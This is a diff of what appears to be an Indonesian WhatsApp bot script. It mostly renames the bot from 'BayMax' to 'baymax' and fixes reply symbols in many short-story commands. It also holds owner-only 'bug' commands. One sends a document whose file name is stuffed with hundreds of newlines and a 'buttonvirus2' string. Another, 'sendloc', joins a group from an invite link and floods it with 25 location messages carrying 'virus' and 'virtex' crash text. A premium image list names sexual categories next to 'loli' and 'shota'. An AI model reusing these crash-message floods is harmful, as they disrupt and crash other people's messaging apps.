-fileName: `? BayMax  ??\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.???? ???`, 
+fileName: `🔥 baymax BOT ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
 mimetype: `application/txt`, 
 jpegThumbnail: ppnyauser, 
 mentions:[sender] }, {quoted:lep})
@@ -3052,24 +3052,24 @@ reply(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
 case 'sendloc':{
-if (!itsByMax) return reply(mess.owner)
+if (!itsMeKayla) return reply(mess.owner)
 if (!q) return reply(`Contoh ${prefix+command} linkgc`)
 if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
 let result = args[0].split('https://chat.whatsapp.com/')[1]
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-let kir = await BayMax.groupAcceptInvite(result)
-var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: BayMax.waUploadToServer })
+let kir = await baymax.groupAcceptInvite(result)
+var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: baymax.waUploadToServer })
 var location = generateWAMessageFromContent(kir, proto.Message.fromObject({
 "locationMessage": {
 "degreesLatitude": -6.936928157735237,
 "degreesLongitude": 107.72270679473877,
-"name": `BayMax  WhatsApp ${virus}`,
-"address": `Created By BayMax ${virtex(prefix)}`,
+"name": `baymax Bot WhatsApp ${virus}`,
+"address": `Created By baymax ${virtex(prefix)}`,
 "jpegThumbnail": messa.imageMessage,
 }
 }), { userJid: from, quoted: lep })
-BayMax.relayMessage(kir, location.message, { messageId: location.key.id })
+baymax.relayMessage(kir, location.message, { messageId: location.key.id })
 await sleep(1000)
 }
 reply(`Sukses Send Bug Sebanyak ${jumlah}`)
@@ -3133,7 +3133,7 @@ case 'glue':
 case '1917': 
 case 'leaves': {
 if (!isPrem) return replyprem(mess.premium)
-if (!q) return reply(`Example : ${prefix+command} BayMax`) 
+if (!q) return reply(`Example : ${prefix+command} baymax`) 
 let link
 if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
 if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
@@ -3193,7 +3193,7 @@ if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-
 if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
 if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
 let anu = await textpro.textpro(link, q)
-BayMax.sendMessage(m.chat, { image: { url: anu }, caption: `${mess.succes}` }, { quoted: m })
+baymax.sendMessage(m.chat, { image: { url: anu }, caption: `${mess.succes}` }, { quoted: m })
 }
 break
 case 'glitchtext':
@@ -3227,7 +3227,7 @@ case 'freecreate':
 case 'galaxystyle':
 case 'lighteffects':{
 if (!isPrem) return replyprem(mess.premium)
-if (!q) return reply(`Example : ${prefix+command} BayMax`) 
+if (!q) return reply(`Example : ${prefix+command} baymax`) 
 let link
 if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
 if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
@@ -3260,7 +3260,7 @@ if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3
 if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
 if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
 let haldwhd = await ephoto(link, q)
-BayMax.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.succes}` }, { quoted: m })
+baymax.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.succes}` }, { quoted: m })
 }
 break
 case 'shadow': 
@@ -3291,7 +3291,7 @@ case 'naturetypography':
 case 'quotesunder':
 case 'shinetext':{
 if (!isPrem) return replyprem(mess.premium)
-if (!q) return reply(`Example : ${prefix+command} BayMax`) 
+if (!q) return reply(`Example : ${prefix+command} baymax`) 
 let link
 if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
 if (/writeart/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html'
@@ -3321,7 +3321,7 @@ if (/metalliceffect/.test(command)) link = 'https://photooxy.com/logo-and-text-e
 if (/embroiderytext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html'
 if (/flamingtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
 let dehe = await photooxy.photoOxy(link, q)
-BayMax.sendMessage(m.chat, { image: { url: dehe }, caption: `${mess.succes}` }, { quoted: m })
+baymax.sendMessage(m.chat, { image: { url: dehe }, caption: `${mess.succes}` }, { quoted: m })
 }
 break
 case 'aesthetic': case 'ahegao': case 'akira': case 'akiyama': case 'ana': case 'anjing': case 'art': case 'ass': case 'asuna': case 'ayuzawa': case 'bdsm': case 'boneka': case 'boruto': case 'bts': case 'cecan': case 'chiho': case 'chitoge': case 'cogan': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cuckold': case 'cum': case 'cyber': case 'darkjokes': case 'deidara': case 'doraemon': case 'eba': case 'elaina': case 'emilia': case 'ero': case 'erza': case 'exo': case 'femdom': case 'foot': case 'freefire': case 'gamewallpaper': case 'gangbang': case 'gifs': case 'glasses': case 'gremory': case 'hekel': case 'hentai': case 'hestia': case 'hijaber': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jahy': case 'jeni': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'kartun': case 'katakata': case 'keneki': case 'kotori': case 'kpop': case 'kucing': case 'kurumi': case 'lisa': case 'loli': case 'madara': case 'masturbation': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'milf': case 'minato': case 'mobil': case 'motor': case 'mountain': case 'naruto': case 'neko': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'orgy': case 'panties': case 'pentol': case 'pokemon': case 'profil': case 'programming': case 'pubg': case 'pussy': case 'randblackpink': case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'ryujin': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'tatasurya': case 'technology': case 'tejina': case 'tentacles': case 'thighs': case 'toukachan': case 'tsunade': case 'waifu': case 'wallhp': case 'wallml': case 'wallnime': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
@@ -3461,7 +3461,7 @@ jpegThumbnail: ppnyauser,
 caption: `Nih Kak @${sender.split("@")[0]}`,
 fileLength: "999999999999",
 mentions: [sender],
-footer: `Powered By BayMax`,
+footer: `Powered By baymax`,
 buttons: buttoons,
 headerType: 4,
 contextInfo: {
@@ -3477,7 +3477,7 @@ contextInfo: {
 "sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
 }}
 }
-BayMax.sendMessage(m.chat, buttonMessaage, { quoted: m })
+baymax.sendMessage(m.chat, buttonMessaage, { quoted: m })
 }
 break
 case 'fox':  
@@ -3489,306 +3489,306 @@ case 'koala':
 if (!isPrem) return replyprem(mess.premium)
 neys = await fetchJson(`https://some-random-api.ml/img/${command}`)
 anu1 = await getBuffer(neys.link)
-BayMax.sendMessage(m.chat, { image: anu1, caption: `${mess.succes}` }, { quoted : m })
+baymax.sendMessage(m.chat, { image: anu1, caption: `${mess.succes}` }, { quoted : m })
 break
 case 'jjmeryani':{
 if (!isPrem) return replyprem(mess.premium)
 let kaydt = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/meryani.json')
 let hayu = kaydt[Math.floor(Math.random() * kaydt.length)];
-BayMax.sendMessage(m.chat,{video:{url:hayu},caption:`${mess.succes}`},{quoted: m})
+baymax.sendMessage(m.chat,{video:{url:hayu},caption:`${mess.succes}`},{quoted: m})
 }
 break
 case 'cerpen_anak':{
 if (!isPrem) return replyprem(mess.premium)
 let cerpe = await cerpen(`anak`)
-reply(`? _*Title :*_ ${cerpe.title}\n? _*Author :*_ ${cerpe.author}\n? _*Category :*_ ${cerpe.kategori}\n? _*Pass Moderation :*_ ${cerpe.lolos}\n? _*Story :*_\n${cerpe.cerita}`)
+reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
 }
 break
 case 'cerpen_bahasadaerah':{
 if (!isPrem) return replyprem(mess.premium)
 let cerpet = await cerpen(`bahasa daerah`)
-reply(`? _*Title :*_ ${cerpet.title}\n? _*Author :*_ ${cerpet.author}\n? _*Category :*_ ${cerpet.kategori}\n? _*Pass Moderation :*_ ${cerpet.lolos}\n? _*Story :*_\n${cerpet.cerita}`)
+reply(`⭔ _*Title :*_ ${cerpet.title}\n⭔ _*Author :*_ ${cerpet.author}\n⭔ _*Category :*_ ${cerpet.kategori}\n⭔ _*Pass Moderation :*_ ${cerpet.lolos}\n⭔ _*Story :*_\n${cerpet.cerita}`)
 }
 break
 case 'cerpen_bahasainggris':{
 if (!isPrem) return replyprem(mess.premium)
 let cerpez = await cerpen(`bahasa Inggris`)
-reply(`? _*Title :*_ ${cerpez.title}\n? _*Author :*_ ${cerpez.author}\n? _*Category :*_ ${cerpez.kategori}\n? _*Pass Moderation :*_ ${cerpez.lolos}\n? _*Story :*_\n${cerpez.cerita}`)
+reply(`⭔ _*Title :*_ ${cerpez.title}\n⭔ _*Author :*_ ${cerpez.author}\n⭔ _*Category :*_ ${cerpez.kategori}\n⭔ _*Pass Moderation :*_ ${cerpez.lolos}\n⭔ _*Story :*_\n${cerpez.cerita}`)
 }
 break
 case 'cerpen_bahasajawa':{
 if (!isPrem) return replyprem(mess.premium)
 let cerpep = await cerpen(`bahasa jawa`)
-reply(`? _*Title :*_ ${cerpep.title}\n? _*Author :*_ ${cerpep.author}\n? _*Category :*_ ${cerpep.kategori}\n? _*Pass Moderation :*_ ${cerpep.lolos}\n? _*Story :*_\n${cerpep.cerita}`)
+reply(`⭔ _*Title :*_ ${cerpep.title}\n⭔ _*Author :*_ ${cerpep.author}\n⭔ _*Category :*_ ${cerpep.kategori}\n⭔ _*Pass Moderation :*_ ${cerpep.lolos}\n⭔ _*Story :*_\n${cerpep.cerita}`)
 }
 break
 case 'cerpen_bahasasunda':{
 if (!isPrem) return replyprem(mess.premium)
 let cerped = await cerpen(`bahasa sunda`)
-reply(`? _*Title :*_ ${cerped.title}\n? _*Author :*_ ${cerped.author}\n? _*Category :*_ ${cerped.kategori}\n? _*Pass Moderation :*_ ${cerped.lolos}\n? _*Story :*_\n${cerped.cerita}`)
+reply(`⭔ _*Title :*_ ${cerped.title}\n⭔ _*Author :*_ ${cerped.author}\n⭔ _*Category :*_ ${cerped.kategori}\n⭔ _*Pass Moderation :*_ ${cerped.lolos}\n⭔ _*Story :*_\n${cerped.cerita}`)
 }
 break
 case 'cerpen_budaya':{
 if (!isPrem) return replyprem(mess.premium)
 let cerper = await cerpen(`budaya`)
-reply(`? _*Title :*_ ${cerper.title}\n? _*Author :*_ ${cerper.author}\n? _*Category :*_ ${cerper.kategori}\n? _*Pass Moderation :*_ ${cerper.lolos}\n? _*Story :*_\n${cerper.cerita}`)
+reply(`⭔ _*Title :*_ ${cerper.title}\n⭔ _*Author :*_ ${cerper.author}\n⭔ _*Category :*_ ${cerper.kategori}\n⭔ _*Pass Moderation :*_ ${cerper.lolos}\n⭔ _*Story :*_\n${cerper.cerita}`)
 }
 break
 case 'cerpen_cinta':{
 if (!isPrem) return replyprem(mess.premium)
 let cerpem = await cerpen(`cinta`)
-reply(`? _*Title :*_ ${cerpem.title}\n? _*Author :*_ ${cerpem.author}\n? _*Category :*_ ${cerpem.kategori}\n? _*Pass Moderation :*_ ${cerpem.lolos}\n? _*Story :*_\n${cerpem.cerita}`)
+reply(`⭔ _*Title :*_ ${cerpem.title}\n⭔ _*Author :*_ ${cerpem.author}\n⭔ _*Category :*_ ${cerpem.kategori}\n⭔ _*Pass Moderation :*_ ${cerpem.lolos}\n⭔ _*Story :*_\n${cerpem.cerita}`)
 }
 break
 case 'cerpen_cintaislami':{
 if (!isPrem) return replyprem(mess.premium)
 let cerpel = await cerpen(`cinta islami`)
-reply(`? _*Title :*_ ${cerpel.title}\n? _*Author :*_ ${cerpel.author}\n? _*Category :*_ ${cerpel.kategori}\n? _*Pass Moderation :*_ ${cerpel.lolos}\n? _*Story :*_\n${cerpel.cerita}`)
+reply(`⭔ _*Title :*_ ${cerpel.title}\n⭔ _*Author :*_ ${cerpel.author}\n⭔ _*Category :*_ ${cerpel.kategori}\n⭔ _*Pass Moderation :*_ ${cerpel.lolos}\n⭔ _*Story :*_\n${cerpel.cerita}`)
 }
 break
 case 'cerpen_cintapertama':{
 if (!isPrem) return replyprem(mess.premium)
 let cerpes = await cerpen(`cinta pertama`)
-reply(`? _*Title :*_ ${cerpes.title}\n? _*Author :*_ ${cerpes.author}\n? _*Category :*_ ${cerpes.kategori}\n? _*Pass Moderation :*_ ${cerpes.lolos}\n? _*Story :*_\n${cerpes.cerita}`)
+reply(`⭔ _*Title :*_ ${cerpes.title}\n⭔ _*Author :*_ ${cerpes.author}\n⭔ _*Category :*_ ${cerpes.kategori}\n⭔ _*Pass Moderation :*_ ${cerpes.lolos}\n⭔ _*Story :*_\n${cerpes.cerita}`)
 }
 break
 case 'cerpen_cintaromantis':{
 if (!isPrem) return replyprem(mess.premium)
 let cerpde = await cerpen(`cinta romantis`)
-reply(`? _*Title :*_ ${cerpde.title}\n? _*Author :*_ ${cerpde.author}\n? _*Category :*_ ${cerpde.kategori}\n? _*Pass Moderation :*_ ${cerpde.lolos}\n? _*Story :*_\n${cerpde.cerita}`)
+reply(`⭔ _*Title :*_ ${cerpde.title}\n⭔ _*Author :*_ ${cerpde.author}\n⭔ _*Category :*_ ${cerpde.kategori}\n⭔ _*Pass Moderation :*_ ${cerpde.lolos}\n⭔ _*Story :*_\n${cerpde.cerita}`)
 }
 break
 case 'cerpen_cintasedih':{
 if (!isPrem) return replyprem(mess.premium)
 let fejdj = await cerpen(`cinta sedih`)
-reply(`? _*Title :*_ ${fejdj.title}\n? _*Author :*_ ${fejdj.author}\n? _*Category :*_ ${fejdj.kategori}\n? _*Pass Moderation :*_ ${fejdj.lolos}\n? _*Story :*_\n${fejdj.cerita}`)
+reply(`⭔ _*Title :*_ ${fejdj.title}\n⭔ _*Author :*_ ${fejdj.author}\n⭔ _*Category :*_ ${fejdj.kategori}\n⭔ _*Pass Moderation :*_ ${fejdj.lolos}\n⭔ _*Story :*_\n${fejdj.cerita}`)
 }
 break
 case 'cerpen_cintasegitiga':{
 if (!isPrem) return replyprem(mess.premium)
 let frofk = await cerpen(`Cinta segitiga`)
-reply(`? _*Title :*_ ${frofk.title}\n? _*Author :*_ ${frofk.author}\n? _*Category :*_ ${frofk.kategori}\n? _*Pass Moderation :*_ ${frofk.lolos}\n? _*Story :*_\n${frofk.cerita}`)
+reply(`⭔ _*Title :*_ ${frofk.title}\n⭔ _*Author :*_ ${frofk.author}\n⭔ _*Category :*_ ${frofk.kategori}\n⭔ _*Pass Moderation :*_ ${frofk.lolos}\n⭔ _*Story :*_\n${frofk.cerita}`)
 }
 break
 case 'cerpen_cintasejati':{
 if (!isPrem) return replyprem(mess.premium)
 let frljkek = await cerpen(`cinta sejati`)
-reply(`? _*Title :*_ ${frljkek.title}\n? _*Author :*_ ${frljkek.author}\n? _*Category :*_ ${frljkek.kategori}\n? _*Pass Moderation :*_ ${frljkek.lolos}\n? _*Story :*_\n${frljkek.cerita}`)
+reply(`⭔ _*Title :*_ ${frljkek.title}\n⭔ _*Author :*_ ${frljkek.author}\n⭔ _*Category :*_ ${frljkek.kategori}\n⭔ _*Pass Moderation :*_ ${frljkek.lolos}\n⭔ _*Story :*_\n${frljkek.cerita}`)
 }
 break
 case 'cerpen_galau':{
 if (!isPrem) return replyprem(mess.premium)
 let cdjfj = await cerpen(`galau`)
-reply(`? _*Title :*_ ${cdjfj.title}\n? _*Author :*_ ${cdjfj.author}\n? _*Category :*_ ${cdjfj.kategori}\n? _*Pass Moderation :*_ ${cdjfj.lolos}\n? _*Story :*_\n${cdjfj.cerita}`)
+reply(`⭔ _*Title :*_ ${cdjfj.title}\n⭔ _*Author :*_ ${cdjfj.author}\n⭔ _*Category :*_ ${cdjfj.kategori}\n⭔ _*Pass Moderation :*_ ${cdjfj.lolos}\n⭔ _*Story :*_\n${cdjfj.cerita}`)
 }
 break
 case 'cerpen_gokil':{
 if (!isPrem) return replyprem(mess.premium)
 let vrkfjf = await cerpen(`gokil`)
-reply(`? _*Title :*_ ${vrkfjf.title}\n? _*Author :*_ ${vrkfjf.author}\n? _*Category :*_ ${vrkfjf.kategori}\n? _*Pass Moderation :*_ ${vrkfjf.lolos}\n? _*Story :*_\n${vrkfjf.cerita}`)
+reply(`⭔ _*Title :*_ ${vrkfjf.title}\n⭔ _*Author :*_ ${vrkfjf.author}\n⭔ _*Category :*_ ${vrkfjf.kategori}\n⭔ _*Pass Moderation :*_ ${vrkfjf.lolos}\n⭔ _*Story :*_\n${vrkfjf.cerita}`)
 }
 break
 case 'cerpen_inspiratif':{
 if (!isPrem) return replyprem(mess.premium)
 let ngkgk = await cerpen(`inspiratif`)
-reply(`? _*Title :*_ ${ngkgk.title}\n? _*Author :*_ ${ngkgk.author}\n? _*Category :*_ ${ngkgk.kategori}\n? _*Pass Moderation :*_ ${ngkgk.lolos}\n? _*Story :*_\n${ngkgk.cerita}`)
+reply(`⭔ _*Title :*_ ${ngkgk.title}\n⭔ _*Author :*_ ${ngkgk.author}\n⭔ _*Category :*_ ${ngkgk.kategori}\n⭔ _*Pass Moderation :*_ ${ngkgk.lolos}\n⭔ _*Story :*_\n${ngkgk.cerita}`)
 }
 break
 case 'cerpen_jepang':{
 if (!isPrem) return replyprem(mess.premium)
 let vrlgk = await cerpen(`jepang`)
-reply(`? _*Title :*_ ${vrlgk.title}\n? _*Author :*_ ${vrlgk.author}\n? _*Category :*_ ${vrlgk.kategori}\n? _*Pass Moderation :*_ ${vrlgk.lolos}\n? _*Story :*_\n${vrlgk.cerita}`)
+reply(`⭔ _*Title :*_ ${vrlgk.title}\n⭔ _*Author :*_ ${vrlgk.author}\n⭔ _*Category :*_ ${vrlgk.kategori}\n⭔ _*Pass Moderation :*_ ${vrlgk.lolos}\n⭔ _*Story :*_\n${vrlgk.cerita}`)
 }
 break
 case 'cerpen_kehidupan':{
 if (!isPrem) return replyprem(mess.premium)
 let ntlgkt = await cerpen(`kehidupan`)
-reply(`? _*Title :*_ ${ntlgkt.title}\n? _*Author :*_ ${ntlgkt.author}\n? _*Category :*_ ${ntlgkt.kategori}\n? _*Pass Moderation :*_ ${ntlgkt.lolos}\n? _*Story :*_\n${ntlgkt.cerita}`)
+reply(`⭔ _*Title :*_ ${ntlgkt.title}\n⭔ _*Author :*_ ${ntlgkt.author}\n⭔ _*Category :*_ ${ntlgkt.kategori}\n⭔ _*Pass Moderation :*_ ${ntlgkt.lolos}\n⭔ _*Story :*_\n${ntlgkt.cerita}`)
 }
 break
 case 'cerpen_keluarga':{
 if (!isPrem) return replyprem(mess.premium)
 let bmflg = await cerpen(`keluarga`)
-reply(`? _*Title :*_ ${bmflg.title}\n? _*Author :*_ ${bmflg.author}\n? _*Category :*_ ${bmflg.kategori}\n? _*Pass Moderation :*_ ${bmflg.lolos}\n? _*Story :*_\n${bmflg.cerita}`)
+reply(`⭔ _*Title :*_ ${bmflg.title}\n⭔ _*Author :*_ ${bmflg.author}\n⭔ _*Category :*_ ${bmflg.kategori}\n⭔ _*Pass Moderation :*_ ${bmflg.lolos}\n⭔ _*Story :*_\n${bmflg.cerita}`)
 }
 break
 case 'cerpen_kisahnyata':{
 if (!isPrem) return replyprem(mess.premium)
 let yptoo = await cerpen(`kisah nyata`)
-reply(`? _*Title :*_ ${yptoo.title}\n? _*Author :*_ ${yptoo.author}\n? _*Category :*_ ${yptoo.kategori}\n? _*Pass Moderation :*_ ${yptoo.lolos}\n? _*Story :*_\n${yptoo.cerita}`)
+reply(`⭔ _*Title :*_ ${yptoo.title}\n⭔ _*Author :*_ ${yptoo.author}\n⭔ _*Category :*_ ${yptoo.kategori}\n⭔ _*Pass Moderation :*_ ${yptoo.lolos}\n⭔ _*Story :*_\n${yptoo.cerita}`)
 }
 break
 case 'cerpen_korea':{
 if (!isPrem) return replyprem(mess.premium)
 let jptpgr = await cerpen(`korea`)
-reply(`? _*Title :*_ ${jptpgr.title}\n? _*Author :*_ ${jptpgr.author}\n? _*Category :*_ ${jptpgr.kategori}\n? _*Pass Moderation :*_ ${jptpgr.lolos}\n? _*Story :*_\n${jptpgr.cerita}`)
+reply(`⭔ _*Title :*_ ${jptpgr.title}\n⭔ _*Author :*_ ${jptpgr.author}\n⭔ _*Category :*_ ${jptpgr.kategori}\n⭔ _*Pass Moderation :*_ ${jptpgr.lolos}\n⭔ _*Story :*_\n${jptpgr.cerita}`)
 }
 break
 case 'cerpen_kristen':{
 if (!isPrem) return replyprem(mess.premium)
 let yesusanjing = await cerpen(`kristen`)
-reply(`? _*Title :*_ ${yesusanjing.title}\n? _*Author :*_ ${yesusanjing.author}\n? _*Category :*_ ${yesusanjing.kategori}\n? _*Pass Moderation :*_ ${yesusanjing.lolos}\n? _*Story :*_\n${yesusanjing.cerita}`)
+reply(`⭔ _*Title :*_ ${yesusanjing.title}\n⭔ _*Author :*_ ${yesusanjing.author}\n⭔ _*Category :*_ ${yesusanjing.kategori}\n⭔ _*Pass Moderation :*_ ${yesusanjing.lolos}\n⭔ _*Story :*_\n${yesusanjing.cerita}`)
 }
 break
 case 'cerpen_liburan':{
 if (!isPrem) return replyprem(mess.premium)
 let frkfkrk = await cerpen(`liburan`)
-reply(`? _*Title :*_ ${frkfkrk.title}\n? _*Author :*_ ${frkfkrk.author}\n? _*Category :*_ ${frkfkrk.kategori}\n? _*Pass Moderation :*_ ${frkfkrk.lolos}\n? _*Story :*_\n${frkfkrk.cerita}`)
+reply(`⭔ _*Title :*_ ${frkfkrk.title}\n⭔ _*Author :*_ ${frkfkrk.author}\n⭔ _*Category :*_ ${frkfkrk.kategori}\n⭔ _*Pass Moderation :*_ ${frkfkrk.lolos}\n⭔ _*Story :*_\n${frkfkrk.cerita}`)
 }
 break
 case 'cerpen_malaysia':{
 if (!isPrem) return replyprem(mess.premium)
 let mzbdjd = await cerpen(`malaysia`)
-reply(`? _*Title :*_ ${mzbdjd.title}\n? _*Author :*_ ${mzbdjd.author}\n? _*Category :*_ ${mzbdjd.kategori}\n? _*Pass Moderation :*_ ${mzbdjd.lolos}\n? _*Story :*_\n${mzbdjd.cerita}`)
+reply(`⭔ _*Title :*_ ${mzbdjd.title}\n⭔ _*Author :*_ ${mzbdjd.author}\n⭔ _*Category :*_ ${mzbdjd.kategori}\n⭔ _*Pass Moderation :*_ ${mzbdjd.lolos}\n⭔ _*Story :*_\n${mzbdjd.cerita}`)
 }
 break
 case 'cerpen_mengharukan':{
 if (!isPrem) return replyprem(mess.premium)
 let bgfngk = await cerpen(`mengharukan`)
-reply(`? _*Title :*_ ${bgfngk.title}\n? _*Author :*_ ${bgfngk.author}\n? _*Category :*_ ${bgfngk.kategori}\n? _*Pass Moderation :*_ ${bgfngk.lolos}\n? _*Story :*_\n${bgfngk.cerita}`)
+reply(`⭔ _*Title :*_ ${bgfngk.title}\n⭔ _*Author :*_ ${bgfngk.author}\n⭔ _*Category :*_ ${bgfngk.kategori}\n⭔ _*Pass Moderation :*_ ${bgfngk.lolos}\n⭔ _*Story :*_\n${bgfngk.cerita}`)
 }
 break
 case 'cerpen_misteri':{
 if (!isPrem) return replyprem(mess.premium)
 let lapdoek = await cerpen(`misteri`)
-reply(`? _*Title :*_ ${lapdoek.title}\n? _*Author :*_ ${lapdoek.author}\n? _*Category :*_ ${lapdoek.kategori}\n? _*Pass Moderation :*_ ${lapdoek.lolos}\n? _*Story :*_\n${lapdoek.cerita}`)
+reply(`⭔ _*Title :*_ ${lapdoek.title}\n⭔ _*Author :*_ ${lapdoek.author}\n⭔ _*Category :*_ ${lapdoek.kategori}\n⭔ _*Pass Moderation :*_ ${lapdoek.lolos}\n⭔ _*Story :*_\n${lapdoek.cerita}`)
 }
 break
 case 'cerpen_motivasi':{
 if (!isPrem) return replyprem(mess.premium)
 let bltkyj = await cerpen(`motivasi`)
-reply(`? _*Title :*_ ${bltkyj.title}\n? _*Author :*_ ${bltkyj.author}\n? _*Category :*_ ${bltkyj.kategori}\n? _*Pass Moderation :*_ ${bltkyj.lolos}\n? _*Story :*_\n${bltkyj.cerita}`)
+reply(`⭔ _*Title :*_ ${bltkyj.title}\n⭔ _*Author :*_ ${bltkyj.author}\n⭔ _*Category :*_ ${bltkyj.kategori}\n⭔ _*Pass Moderation :*_ ${bltkyj.lolos}\n⭔ _*Story :*_\n${bltkyj.cerita}`)
 }
 break
 case 'cerpen_nasihat':{
 if (!isPrem) return replyprem(mess.premium)
 let qpeidek = await cerpen(`nasihat`)
-reply(`? _*Title :*_ ${qpeidek.title}\n? _*Author :*_ ${qpeidek.author}\n? _*Category :*_ ${qpeidek.kategori}\n? _*Pass Moderation :*_ ${qpeidek.lolos}\n? _*Story :*_\n${qpeidek.cerita}`)
